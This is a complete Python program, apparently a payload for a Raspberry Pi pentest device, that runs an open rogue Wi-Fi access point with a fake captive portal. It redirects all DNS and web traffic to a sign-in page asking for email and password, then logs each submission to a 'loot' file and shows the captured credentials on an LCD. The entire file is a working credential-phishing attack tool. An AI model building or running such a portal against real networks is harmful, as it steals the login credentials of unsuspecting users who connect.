#!/usr/bin/env python3
"""
KTOx Payload – Captive Portal
==============================
Author: KTOx Team

Full captive portal with menu-driven management:
- Start/stop/restart the AP
- Select portal page (from /root/KTOx/portals/ or built-in)
- Edit SSID
- Manage MAC whitelist
- View captured credentials

Controls:
  UP/DOWN  – Navigate menu / scroll
  LEFT     – Delete char (SSID editor)
  RIGHT    – Add char (SSID editor)
  OK       – Select action / confirm
  KEY1     – Quick toggle portal on/off
  KEY2     – (reserved)
  KEY3     – Back / Exit

Loot: /root/KTOx/loot/Portal/
Dependencies: hostapd, dnsmasq, iptables, RPi.GPIO, LCD_1in44, PIL
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote_plus
from socketserver import ThreadingMixIn

ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)
from _darksec_keyboard import DarkSecKeyboard

# Hardware
import RPi.GPIO as GPIO
import LCD_1in44
from PIL import Image, ImageDraw, ImageFont

# ----------------------------------------------------------------------
# Pins & LCD
# ----------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()
f9 = font(9)
f11 = font(11)

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

# ----------------------------------------------------------------------
# Paths & constants
# ----------------------------------------------------------------------
PORTAL_DIR = "/root/KTOx/portals"          # user‑provided templates
LOOT_DIR = "/root/KTOx/loot/Portal"
CONFIG_PATH = os.path.join(LOOT_DIR, "portal_config.json")
WHITELIST_PATH = os.path.join(LOOT_DIR, "whitelist.json")
CREDS_LOG = os.path.join(LOOT_DIR, "creds.log")
HOSTAPD_CONF = "/tmp/ktox_hostapd.conf"
DNSMASQ_CONF = "/tmp/ktox_dnsmasq.conf"
GATEWAY_IP = "10.0.77.1"
DHCP_RANGE = "10.0.77.10,10.0.77.250,12h"
HTTP_PORT = 80

os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(PORTAL_DIR, exist_ok=True)

# Menu items
MENU_ITEMS = [
    "Status", "Start Portal", "Stop Portal",
    "Restart Portal", "Select Portal", "Set SSID",
    "Whitelist", "View Creds",
]

# ----------------------------------------------------------------------
# Built‑in simple portal template
# ----------------------------------------------------------------------
BUILTIN_WIFI_LOGIN = """<!DOCTYPE html>
<html><head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,sans-serif;background:#1a1a2e;color:#fff;
display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#16213e;padding:30px;border-radius:12px;
box-shadow:0 4px 20px rgba(0,0,0,.4);max-width:380px;width:90%}
h2{margin-top:0;color:#e94560}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #8b0000;
border-radius:6px;box-sizing:border-box;background:#1a1a2e;color:#fff}
button{width:100%;padding:14px;background:#e94560;color:#fff;border:none;
border-radius:6px;cursor:pointer;font-size:16px;margin-top:10px}
</style></head><body>
<div class="box">
<h2>WiFi Authentication</h2>
<p>Please sign in to access the network.</p>
<form method="POST" action="/login">
<input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>"""

BUILTIN_SUCCESS = """<!DOCTYPE html>
<html><head><title>Connected</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial,sans-serif;text-align:center;padding:60px;
background:#1a1a2e;color:#fff}
h2{color:#4ecca3}.check{font-size:64px;color:#4ecca3}</style></head>
<body><div class="check">&#10003;</div>
<h2>Connected!</h2><p>You are now online.</p></body></html>"""

# ----------------------------------------------------------------------
# Shared state
# ----------------------------------------------------------------------
lock = threading.Lock()
view = "menu"          # menu, status, select_portal, whitelist, creds, edit_ssid
menu_idx = 0
scroll_pos = 0
status_msg = "Idle"
portal_running = False
running = True
credentials = []
clients_connected = 0

# Process handles
_hostapd_proc = None
_dnsmasq_proc = None
_portal_server = None
_iface = None

# ----------------------------------------------------------------------
# JSON helpers
# ----------------------------------------------------------------------
def _load_json(path, default):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except:
        return default

def _save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except:
        pass

def _load_config():
    return _load_json(CONFIG_PATH, {"selected_portal": "", "ssid": "FreeWiFi"})

def _save_config(cfg):
    _save_json(CONFIG_PATH, cfg)

def _load_whitelist():
    return _load_json(WHITELIST_PATH, [])

def _save_whitelist(wl):
    _save_json(WHITELIST_PATH, wl)

# ----------------------------------------------------------------------
# Portal discovery
# ----------------------------------------------------------------------
def _discover_portals():
    portals = []
    if not os.path.isdir(PORTAL_DIR):
        return portals
    for entry in sorted(os.listdir(PORTAL_DIR)):
        entry_path = os.path.join(PORTAL_DIR, entry)
        if not os.path.isdir(entry_path):
            continue
        # look for index.html or login.html
        if os.path.isfile(os.path.join(entry_path, "index.html")) or \
           os.path.isfile(os.path.join(entry_path, "login.html")):
            portals.append(entry)
    return portals

def _get_portal_index(portal_name):
    """Return full path to index.html or login.html for a portal."""
    base = os.path.join(PORTAL_DIR, portal_name)
    if os.path.isfile(os.path.join(base, "index.html")):
        return os.path.join(base, "index.html")
    if os.path.isfile(os.path.join(base, "login.html")):
        return os.path.join(base, "login.html")
    return None

# ----------------------------------------------------------------------
# Client counter & lease helpers
# ----------------------------------------------------------------------
def _count_clients():
    try:
        res = subprocess.run(["sudo", "hostapd_cli", "all_sta"],
                             capture_output=True, text=True, timeout=5)
        macs = re.findall(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", res.stdout, re.I)
        return len(set(macs))
    except:
        return 0

def _count_creds():
    try:
        with open(CREDS_LOG, "r") as f:
            return sum(1 for _ in f if _.strip())
    except:
        return 0

def _get_last_dhcp_mac():
    try:
        with open("/var/lib/misc/dnsmasq.leases", "r") as f:
            lines = f.read().splitlines()
        if not lines:
            return None
        parts = lines[-1].strip().split()
        if len(parts) >= 2:
            return parts[1].upper()
    except:
        pass
    return None

# ----------------------------------------------------------------------
# HTTP credential‑capture server
# ----------------------------------------------------------------------
class CaptiveHandler(BaseHTTPRequestHandler):
    template_dir = None   # if None, use builtin HTML

    def _serve_file(self, path, content_type="text/html"):
        try:
            with open(path, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        except:
            self.send_error(404)

    def _guess_content_type(self, path):
        ext = os.path.splitext(path)[1].lower()
        types = {
            ".html": "text/html", ".css": "text/css", ".js": "application/javascript",
            ".png": "image/png", ".jpg": "image/jpeg", ".ico": "image/x-icon",
        }
        return types.get(ext, "text/html")

    def do_GET(self):
        path = self.path.split("?")[0]
        if self.template_dir:
            # serve from portal directory
            if path in ("/", ""):
                idx = _get_portal_index(os.path.basename(self.template_dir))
                if idx:
                    self._serve_file(idx)
                else:
                    self.send_error(404)
            else:
                safe = path.lstrip("/").replace("..", "")
                full = os.path.join(self.template_dir, safe)
                if os.path.isfile(full):
                    ct = self._guess_content_type(full)
                    self._serve_file(full, ct)
                else:
                    self.send_response(302)
                    self.send_header("Location", "/")
                    self.end_headers()
        else:
            # built‑in template
            html = BUILTIN_WIFI_LOGIN.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(html)))
            self.end_headers()
            self.wfile.write(html)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
        params = parse_qs(body)
        entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "src_ip": self.client_address[0],
            "fields": {k: unquote_plus(v[0]) for k, v in params.items() if v}
        }
        if entry["fields"]:
            with lock:
                credentials.append(entry)
            # append to log file
            try:
                with open(CREDS_LOG, "a") as f:
                    f.write(f"[{entry['timestamp']}] {entry['src_ip']} ")
                    f.write(" ".join(f"{k}={v}" for k, v in entry['fields'].items()))
                    f.write("\n")
            except:
                pass
        # send success page
        html = BUILTIN_SUCCESS.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(html)))
        self.end_headers()
        self.wfile.write(html)

    def log_message(self, fmt, *args):
        pass

class ThreadedPortalServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

# ----------------------------------------------------------------------
# Network setup / teardown
# ----------------------------------------------------------------------
def _run(cmd):
    subprocess.run(cmd, capture_output=True, timeout=5)

def _set_managed_mode(iface):
    _run(["sudo", "ip", "link", "set", iface, "down"])
    _run(["sudo", "iw", "dev", iface, "set", "type", "managed"])
    _run(["sudo", "ip", "link", "set", iface, "up"])

def _write_hostapd_conf(iface, ssid, channel=6):
    with open(HOSTAPD_CONF, "w") as f:
        f.write(f"interface={iface}\ndriver=nl80211\nssid={ssid}\n")
        f.write(f"hw_mode=g\nchannel={channel}\nwmm_enabled=0\n")
        f.write("auth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n")

def _write_dnsmasq_conf(iface):
    with open(DNSMASQ_CONF, "w") as f:
        f.write(f"interface={iface}\ndhcp-range={DHCP_RANGE}\n")
        f.write(f"dhcp-option=3,{GATEWAY_IP}\ndhcp-option=6,{GATEWAY_IP}\n")
        f.write(f"address=/#/{GATEWAY_IP}\nno-resolv\nlog-queries\nlog-dhcp\n")

def _iptables_whitelist_add(iface, mac):
    _run(["sudo", "iptables", "-t", "nat", "-I", "PREROUTING",
          "-i", iface, "-m", "mac", "--mac-source", mac, "-j", "ACCEPT"])

def _setup_iptables(iface):
    # Redirect HTTP, HTTPS, DNS to portal
    for dport, proto in [("80", "tcp"), ("443", "tcp"), ("53", "udp")]:
        dest = f"{GATEWAY_IP}:{HTTP_PORT}" if proto == "tcp" else f"{GATEWAY_IP}:53"
        _run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
              "-i", iface, "-p", proto, "--dport", dport,
              "-j", "DNAT", "--to-destination", dest])
    _run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
    _run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    for mac in _load_whitelist():
        _iptables_whitelist_add(iface, mac)

def _teardown_iptables():
    _run(["sudo", "iptables", "-t", "nat", "-F"])
    _run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])

# ----------------------------------------------------------------------
# Portal lifecycle
# ----------------------------------------------------------------------
def _start_portal():
    global portal_running, status_msg, _hostapd_proc, _dnsmasq_proc, _portal_server
    iface = _iface
    if not iface:
        with lock:
            status_msg = "No WiFi interface"
        return
    cfg = _load_config()
    ssid = cfg.get("ssid", "FreeWiFi")
    portal_name = cfg.get("selected_portal", "")
    portal_path = os.path.join(PORTAL_DIR, portal_name) if portal_name else None

    with lock:
        status_msg = "Configuring..."

    # Prepare interface
    _set_managed_mode(iface)
    time.sleep(0.3)
    _run(["sudo", "ip", "addr", "flush", "dev", iface])
    _run(["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface])
    _run(["sudo", "ip", "link", "set", iface, "up"])

    # Kill leftovers
    for p in ("hostapd", "dnsmasq"):
        _run(["sudo", "killall", p])
    time.sleep(0.3)

    # Start hostapd
    _write_hostapd_conf(iface, ssid)
    _hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(1.5)
    if _hostapd_proc.poll() is not None:
        with lock:
            status_msg = "hostapd failed"
        return

    # Start dnsmasq
    _write_dnsmasq_conf(iface)
    _dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(0.5)
    if _dnsmasq_proc.poll() is not None:
        with lock:
            status_msg = "dnsmasq failed"
        _hostapd_proc.terminate()
        return

    # HTTP server
    if portal_path and os.path.isdir(portal_path):
        CaptiveHandler.template_dir = portal_path
    else:
        CaptiveHandler.template_dir = None

    _portal_server = ThreadedPortalServer(("0.0.0.0", HTTP_PORT), CaptiveHandler)
    threading.Thread(target=_portal_server.serve_forever, daemon=True).start()

    _setup_iptables(iface)

    with lock:
        portal_running = True
        status_msg = f"Portal active ({portal_name or 'built-in'})"

    # Start client counter thread
    def _counter_loop():
        global clients_connected
        while portal_running:
            clients_connected = _count_clients()
            time.sleep(5)
    threading.Thread(target=_counter_loop, daemon=True).start()

def _stop_portal():
    global portal_running, status_msg, _hostapd_proc, _dnsmasq_proc, _portal_server
    with lock:
        status_msg = "Stopping..."
    if _portal_server:
        try:
            _portal_server.shutdown()
        except:
            pass
        _portal_server = None
    if _hostapd_proc:
        _hostapd_proc.terminate()
        _hostapd_proc.wait(timeout=5)
        _hostapd_proc = None
    if _dnsmasq_proc:
        _dnsmasq_proc.terminate()
        _dnsmasq_proc.wait(timeout=5)
        _dnsmasq_proc = None
    _run(["sudo", "killall", "hostapd", "dnsmasq"])
    _teardown_iptables()
    if _iface:
        _set_managed_mode(_iface)
    with lock:
        portal_running = False
        status_msg = "Portal stopped"

def _restart_portal():
    _stop_portal()
    time.sleep(1)
    _start_portal()

# ----------------------------------------------------------------------
# Whitelist management
# ----------------------------------------------------------------------
def _add_client_to_whitelist():
    mac = _get_last_dhcp_mac()
    if not mac:
        return "No DHCP lease found"
    wl = _load_whitelist()
    if mac in wl:
        return f"{mac} already whitelisted"
    wl.append(mac)
    _save_whitelist(wl)
    if portal_running and _iface:
        _iptables_whitelist_add(_iface, mac)
    return f"Added {mac}"

def _remove_whitelist_entry(idx):
    wl = _load_whitelist()
    if 0 <= idx < len(wl):
        removed = wl.pop(idx)
        _save_whitelist(wl)
        return f"Removed {removed}"
    return "Invalid index"

# ----------------------------------------------------------------------
# LCD drawing functions
# ----------------------------------------------------------------------
def draw_menu():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill="#8B0000")
    d.text((4,3), "CAPTIVE PORTAL", font=f9, fill=(231, 76, 60))
    tag = "[ON]" if portal_running else "[OFF]"
    d.text((90,3), tag, font=f9, fill=(231, 76, 60) if portal_running else "#FF4444")
    y = 20
    for i, item in enumerate(MENU_ITEMS):
        if i == menu_idx:
            d.text((4, y), f"> {item}", font=f9, fill=(171, 178, 185))
        else:
            d.text((4, y), f"  {item}", font=f9, fill=(171, 178, 185))
        y += 12
        if y > 110: break
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "UP/DN OK  K1=Toggle  K3=Exit", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_status():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill="#8B0000")
    d.text((4,3), "PORTAL STATUS", font=f9, fill=(231, 76, 60))
    cfg = _load_config()
    ssid = cfg.get("ssid", "FreeWiFi")
    portal = cfg.get("selected_portal", "") or "built-in"
    creds = _count_creds()
    y = 20
    d.text((4, y), f"Service: {'RUNNING' if portal_running else 'STOPPED'}", font=f9, fill=(231, 76, 60) if portal_running else "#FF4444"); y+=12
    d.text((4, y), f"SSID: {ssid[:16]}", font=f9, fill=(171, 178, 185)); y+=12
    d.text((4, y), f"Portal: {portal[:16]}", font=f9, fill=(171, 178, 185)); y+=12
    d.text((4, y), f"Clients: {clients_connected}", font=f9, fill=(171, 178, 185)); y+=12
    d.text((4, y), f"Creds: {creds}", font=f9, fill=(212, 172, 13)); y+=12
    d.text((4, y), f"IP: {GATEWAY_IP}", font=f9, fill=(113, 125, 126)); y+=12
    d.text((4, y), status_msg[:22], font=f9, fill=(231, 76, 60))
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "K3=Back", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_select_portal():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill="#8B0000")
    d.text((4,3), "SELECT PORTAL", font=f9, fill=(231, 76, 60))
    portals = _discover_portals()
    current = _load_config().get("selected_portal", "")
    if not portals:
        d.text((4,40), "No portals found", font=f9, fill=(231, 76, 60))
        d.text((4,52), "Place HTML in:", font=f9, fill=(113, 125, 126))
        d.text((4,64), "/root/KTOx/portals/", font=f9, fill=(113, 125, 126))
        d.text((4,76), "Subfolder with", font=f9, fill=(113, 125, 126))
        d.text((4,88), "index.html or login.html", font=f9, fill=(113, 125, 126))
    else:
        y = 20
        for i, name in enumerate(portals[scroll_pos:scroll_pos+7]):
            sel = (scroll_pos + i) == scroll_pos
            active = (name == current)
            color = "#E74C3C" if active else ("#FFBBBB" if sel else "#AAAAAA")
            prefix = "> " if sel else "  "
            star = "*" if active else " "
            d.text((4, y), f"{prefix}{star}{name[:18]}", font=f9, fill=color)
            y += 12
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "UP/DN OK  K3=Back", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_whitelist():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill="#8B0000")
    d.text((4,3), "WHITELIST", font=f9, fill=(231, 76, 60))
    wl = _load_whitelist()
    if not wl:
        d.text((4,40), "No MACs whitelisted", font=f9, fill=(113, 125, 126))
        d.text((4,52), "OK to add last DHCP", font=f9, fill=(113, 125, 126))
        d.text((4,64), "client to whitelist", font=f9, fill=(113, 125, 126))
    else:
        y = 20
        for i, mac in enumerate(wl[scroll_pos:scroll_pos+7]):
            sel = (scroll_pos + i) == scroll_pos
            d.text((4, y), f"{'> ' if sel else '  '}{mac}", font=f9, fill=(171, 178, 185) if sel else "#AAAAAA")
            y += 12
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), f"{len(wl)} MACs  OK:Add  KEY2:Del  K3:Back", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_creds():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill="#8B0000")
    d.text((4,3), "CAPTURED CREDS", font=f9, fill=(231, 76, 60))
    lines = []
    try:
        with open(CREDS_LOG, "r") as f:
            lines = f.read().splitlines()
    except:
        pass
    if not lines:
        d.text((4,40), "No credentials yet", font=f9, fill=(113, 125, 126))
    else:
        y = 20
        for line in lines[scroll_pos:scroll_pos+7]:
            d.text((4, y), line[:23], font=f9, fill=(212, 172, 13))
            y += 12
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), f"{len(lines)} entries  U/D:Scroll  K3:Back", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ssid_editor(current_ssid):
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0,0,W,17), fill="#8B0000")
    d.text((4,3), "EDIT SSID", font=f9, fill=(231, 76, 60))
    d.text((4,25), f"Current: {current_ssid[:20]}", font=f9, fill=(171, 178, 185))
    d.text((4,45), "Use keyboard helper", font=f9, fill=(171, 178, 185))
    d.text((4,60), "Press OK to edit", font=f9, fill=(231, 76, 60))
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "OK:Edit  K3:Cancel", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

# ----------------------------------------------------------------------
# Simple keyboard helper (popup)
# ----------------------------------------------------------------------
def lcd_keyboard(title, default=""):
    kb = DarkSecKeyboard(width=W, height=H, lcd=LCD, gpio_pins=PINS, gpio_module=GPIO)
    result = kb.run()
    if result is None:
        return None
    result = result.strip()
    return result if result else default

# ----------------------------------------------------------------------
# Main loop
# ----------------------------------------------------------------------
def main():
    global view, menu_idx, scroll_pos, portal_running, running, _iface
    # Select WiFi interface
    ifaces = [name for name in os.listdir("/sys/class/net") if name.startswith("wlan")]
    if not ifaces:
        img = Image.new("RGB", (W, H), (10, 0, 0))
        d = ImageDraw.Draw(img)
        d.text((4,40), "No WiFi interface", font=f9, fill="red")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(2)
        return
    _iface = "wlan1" if "wlan1" in ifaces else ifaces[0]
    # Splash
    img = Image.new("RGB", (W, H), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((6,16), "CAPTIVE PORTAL", font=f11, fill=(231, 76, 60))
    d.text((4,36), "WiFi credential", font=f9, fill=(113, 125, 126))
    d.text((4,48), "capture portal", font=f9, fill=(113, 125, 126))
    d.text((4,68), f"Iface: {_iface}", font=f9, fill=(171, 178, 185))
    d.text((4,80), "UP/DN:Nav  OK:Select", font=f9, fill=(86, 101, 115))
    d.text((4,92), "K1:Toggle  K3:Exit", font=f9, fill=(86, 101, 115))
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    while running:
        btn = wait_btn(0.1)
        if view == "menu":
            draw_menu()
            if btn == "UP":
                menu_idx = max(0, menu_idx-1)
            elif btn == "DOWN":
                menu_idx = min(len(MENU_ITEMS)-1, menu_idx+1)
            elif btn == "OK":
                action = MENU_ITEMS[menu_idx]
                if action == "Status":
                    view = "status"
                elif action == "Start Portal":
                    threading.Thread(target=_start_portal, daemon=True).start()
                    view = "status"
                elif action == "Stop Portal":
                    threading.Thread(target=_stop_portal, daemon=True).start()
                    view = "status"
                elif action == "Restart Portal":
                    threading.Thread(target=_restart_portal, daemon=True).start()
                    view = "status"
                elif action == "Select Portal":
                    view = "select_portal"
                    scroll_pos = 0
                elif action == "Set SSID":
                    view = "edit_ssid"
                elif action == "Whitelist":
                    view = "whitelist"
                    scroll_pos = 0
                elif action == "View Creds":
                    view = "creds"
                    scroll_pos = 0
            elif btn == "KEY1":
                # Quick toggle
                if portal_running:
                    threading.Thread(target=_stop_portal, daemon=True).start()
                else:
                    threading.Thread(target=_start_portal, daemon=True).start()
                time.sleep(0.3)
            elif btn == "KEY3":
                break

        elif view == "status":
            draw_status()
            if btn == "KEY3":
                view = "menu"

        elif view == "select_portal":
            draw_select_portal()
            portals = _discover_portals()
            if btn == "UP":
                scroll_pos = max(0, scroll_pos-1)
            elif btn == "DOWN":
                scroll_pos = min(max(0, len(portals)-1), scroll_pos+1)
            elif btn == "OK" and portals:
                cfg = _load_config()
                cfg["selected_portal"] = portals[scroll_pos]
                _save_config(cfg)
                status_msg = f"Selected {portals[scroll_pos]}"
                view = "menu"
            elif btn == "KEY3":
                view = "menu"

        elif view == "whitelist":
            draw_whitelist()
            wl = _load_whitelist()
            if btn == "UP":
                scroll_pos = max(0, scroll_pos-1)
            elif btn == "DOWN":
                scroll_pos = min(max(0, len(wl)-1), scroll_pos+1)
            elif btn == "OK":
                msg = _add_client_to_whitelist()
                with lock:
                    status_msg = msg
                time.sleep(1)
            elif btn == "KEY2":
                if wl:
                    msg = _remove_whitelist_entry(scroll_pos)
                    with lock:
                        status_msg = msg
                    scroll_pos = min(scroll_pos, len(wl)-1)
                    if scroll_pos < 0: scroll_pos = 0
                time.sleep(1)
            elif btn == "KEY3":
                view = "menu"

        elif view == "creds":
            draw_creds()
            # count lines for scrolling
            try:
                with open(CREDS_LOG, "r") as f:
                    total = len(f.read().splitlines())
            except:
                total = 0
            if btn == "UP":
                scroll_pos = max(0, scroll_pos-1)
            elif btn == "DOWN":
                scroll_pos = min(max(0, total-1), scroll_pos+1)
            elif btn == "KEY3":
                view = "menu"

        elif view == "edit_ssid":
            cfg = _load_config()
            current = cfg.get("ssid", "FreeWiFi")
            draw_ssid_editor(current)
            if btn == "OK":
                new_ssid = lcd_keyboard("EDIT SSID", current)
                if new_ssid:
                    cfg = _load_config()
                    cfg["ssid"] = new_ssid.strip() or "FreeWiFi"
                    _save_config(cfg)
                    status_msg = f"SSID set to {cfg['ssid']}"
                view = "menu"
            elif btn == "KEY3":
                view = "menu"
        time.sleep(0.05)

    # Cleanup
    if portal_running:
        _stop_portal()
    LCD.LCD_Clear()
    GPIO.cleanup()

if __name__ == "__main__":
    main()
